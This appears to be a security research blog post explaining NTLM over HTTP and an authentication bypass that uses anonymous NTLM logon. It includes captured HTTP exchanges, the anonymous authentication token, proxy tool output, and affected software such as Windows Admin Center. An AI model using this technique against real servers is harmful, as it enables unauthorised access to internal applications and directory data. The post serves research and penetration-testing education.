+++
title = "Bypassing NTLM auth over HTTP"
description = "Exploring the so called NT ANONYMOUS_LOGON user through HTTP endpoints"
tags = [
"howto",
"research",
"ntlm",
"web",
]
date = "2022-03-06 17:00:00"
categories = [
"Research",
"Exploration",
]
keywords = [
"ntlm",
"howto",
"research",
"anonymous",
]
image = "cover.png"

+++


Exploring the so-called NTLM ANONYMOUS_LOGON user through HTTP endpoints.
<!--more-->


# Some background

Through the years NTLM authentication has been used in various protocols as a convenient way
to authenticate on a Windows network :

- SMB usually for file sharing
- RDP 
- NNS an "authenticated" TCP stack for .NET applications
- HTTP


The NTLM authentication usually takes place in 3 steps :

```text
CLIENT Sends a negotiation message --------------------> SERVER   
CLIENT <-------------------- A challenge is given by the SERVER
CLIENT Sends a challenge response (creds) -------------> SERVER         
```

NTLM versions (1/2) and various negotiation flags will determine how the authentication is *"encrypted"* between
the server and the client.



Btw [http://davenport.sourceforge.net/ntlm.html]([http://davenport.sourceforge.net/ntlm.html]) is a must-read if you're getting started with this protocol !

# NTLM over HTTP

In this article, we'll turn our attention to its usage over the HTTP protocol.

If you ever accessed your company's intranet after logging in with your workstation without being asked for credentials, 
chances are NTLM was used in the background to authenticate to the remote webserver.

![Home](/ntlm_http/intra_example.png)

NTLM being a connection oriented protocol, HTTP keep-alive is used to keep the user authenticated through the same connection.

### Negotiation over HTTP
Let's look at how the protocol is actually working over the wire :

The client sends :
```http request
GET / HTTP/1.1
Host: 192.168.0.41:8080
```

The reply from the server indicates a `401 Unauthorized` but lets us know that NTLM authentication is available
through the `WWW-Authenticate` header :

```http request
HTTP/1.1 401 Unauthorized
Date: Sat, 04 Jun 2022 02:19:43 GMT
WWW-Authenticate: NTLM
Content-Length: 381
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
</body></html>
```

The client will then initiate a negotiation, over the same connection, using the `Authorization` header with the
`NTLM` prefix.

The base64 encoded string is a [Type 1 message](http://davenport.sourceforge.net/ntlm.html#theType1Message) letting the server know the client's capabilities :

```http request
GET / HTTP/1.1
Host: 192.168.0.41:8080
Authorization: NTLM TlRMTVNTUAABAAAAMYCI4AAAAAAoAAAAAAAAACgAAAAAAAAAAAAAAA==
```

### Server challenge over HTTP

The server still replies with a `401 Unauthorized` but this time provides a [Type 2 message](http://davenport.sourceforge.net/ntlm.html#theType2Message) in the `WWW-Authenticate`
header :

```http request
HTTP/1.1 401 Unauthorized
Date: Sat, 04 Jun 2022 02:19:43 GMT
Server: Apache
WWW-Authenticate: NTLM TlRMTVNTUAACAAAADAAMADgAAAA1gonilM550+1I+dYAAAAAAAAAAJIAkgBEAAAACgA5OAAAAA9EAE8ATQBBAEkATgACAAwARABPAE0AQQBJAE4AAQAMAEEAUABQAFMAMQA1AAQAGABkAG8AbQBhAGkAbgAuAGwAbwBjAGEAbAADACYAQQBQAFAAUwAxADUALgBkAG8AbQBhAGkAbgAuAGwAbwBjAGEAbAAFABgAZABvAG0AYQBpAG4ALgBsAG8AYwBhAGwABwAIAKFXn425d9gBAAAAAA==
Content-Length: 381
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
</body></html>
```

This header provides multiple information about the remote server, including it's operating system, DNS names, and which Domain it belongs to.

[Internal Information Disclosure using Hidden NTLM Authentication](https://medium.com/swlh/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)
is a great read an often used by bug-hunters to find and disclose information about their target.

At this point, all HTTP clients gives you the choice to input a username and password, however, none of them are mentionning another
connection method.

Now let's think about this for a second :

- We know SMB can use NTLM
- We know SMB has an "Anonymous" feature

### Challenge response and auth over HTTP

Reading carefully [Microsoft documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4) about NTLM 
reveals an interesting bit of information that's usually NOT implemented by NTLM clients :

![Home](/ntlm_http/MS_NOTE_ANON.png)

Using Golang as a framework, we were able to implement the missing feature in an already existing NTLM library :

![Home](/ntlm_http/godiff.png)

Kudos to [@Bodgit](https://github.com/bodgit) for creating such a clean library !

#### Creating a client supporting Anonymous authentication

While modifying a browser for this particular case could be interesting, we instead decided to write a [proxy](https://github.com/LeakIX/NTLMAnonProxy) handling
the anonymous authentication workflow over HTTP :

```shell
$ ./NTLMAnonProxy-linux-amd64 127.0.0.1 9999
2022/06/04 04:18:06 Starting NTLM HTTP proxy on 127.0.0.1:9999
2022/06/04 04:18:41 http://192.168.0.41:8080/ : Intercepted request
2022/06/04 04:18:41 http://192.168.0.41:8080/ : Proposing NTLM, forcing ANONYMOUS auth
2022/06/04 04:18:41 http://192.168.0.41:8080/ : Received NTLM challenge
2022/06/04 04:18:41 http://192.168.0.41:8080/ : Sent NTLM AUTH
```

#### Checking the results

We know continue our request process over the same connection, and instead of providing a username and password, we implement
the anonymous authentication.

This has the effect of requesting Windows to authenticate as `ANONYMOUS LOGON/NT AUTHORITY`.

```http request
GET / HTTP/1.1
Host: 192.168.0.41:8080
Authorization: NTLM TlRMTVNTUAADAAAAAQABAEgAAAAAAAAASQAAAAAAAABIAAAAAAAAAEgAAAAAAAAASAAAABAAEABJAAAANYKJ4AAAAAAAAAAAAEkIUrOKi10Sk8ki/EV6PpA=
```

#### The application 

What will happen next depends on the application using NTLM as authentication source.

If the application is configured to accept any login, `ANONYMOUS LOGON/NT AUTHORITY` will be considered as valid
authentication and various privileges can be granted to the end-user :

```http request
HTTP/1.1 200 OK
Date: Sat, 04 Jun 2022 02:19:43 GMT
X-UA-Compatible: IE=edge
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-Frame-Options: deny
Content-Length: 6901
Content-Type: text/html; charset=ISO-8859-1
```

And in this case we are indeed allowed access to the application (an intranet) as `ANONYMOUS LOGON/NT AUTHORITY`.


## Affected softwares

Various software are actually affected by this flaw.

One of the surprise we found was the **Windows Admin Center**, a piece of software used to administer Domains and
cluster of the web :

![Home](/ntlm_http/wma-auth1.png)

As it can be seen here, requests to Active Directory can be made, and all kinds of information can be retrieved through the API :

![Home](/ntlm_http/wma-auth2.png)

While we did notice some **Powershell endpoints** exposed, however Windows UAC acts as a last protection and requests a confirmation on
the local machine.

This flaw we rediscovered was in fact what we believe to be `CVE-2021-27066` has been fixed with a `403` page after
anonymous authentication.

Plenty of servers are still online with a older versions, and pen-testing your next LAN should definitely include this technique !

## Other protocols

Here we explored HTTP as we couldn't find any client allowing for such authentication and suspected it would yield results.

[NNS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nns/aaa2adb8-34a0-461c-941e-fca1319c5a50) is another protocol often used by .NET applications and was in fact the source of the last [Veeam critical RCE vulnerability](https://twitter.com/ptswarm/status/1503360681978077185).

We will continue exploring other protocols for the same mis-configuration !
